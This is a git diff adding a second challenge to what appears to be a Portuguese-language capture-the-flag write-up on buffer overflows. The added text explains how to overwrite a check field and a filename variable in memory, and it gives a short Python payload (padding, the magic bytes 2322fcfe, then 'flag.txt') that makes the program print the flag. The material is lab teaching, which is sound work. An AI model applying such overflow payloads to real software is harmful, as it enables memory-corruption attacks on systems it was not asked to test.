@@ -77,3 +77,17 @@ s += b"flag.txt\0"
 ```
 
 Ao executar o programa com input `s`, este abre o ficheiro `flag.txt` e imprime os seus conteúdos, revelando a flag.
+
+## Desafio 2
+
+Neste novo programa foi introduzido um novo campo de verificação, `val`. Está localizado em memória entre `meme_file` e `buffer`. Quer isto dizer que para reescrever o `meme_file` com a mesma técnica utilizada anteriormente será necessário reescrever também em `val`. Não será problema uma vez que o `scanf` aceita agora 32 bytes e val tem apenas 4 de tamanho.
+
+```python
+s = b""
+for i in range(20):
+	s += b"a"
+s += bytes.fromhex('2322fcfe')
+s += b"flag.txt\0"
+```
+
+Desta vez colocamos também na string os 4 bytes extra necessários para o programa proceder à abertura do ficheiro. Mais uma vez, o programa abre o ficheiro `flag.txt` e revela a flag.
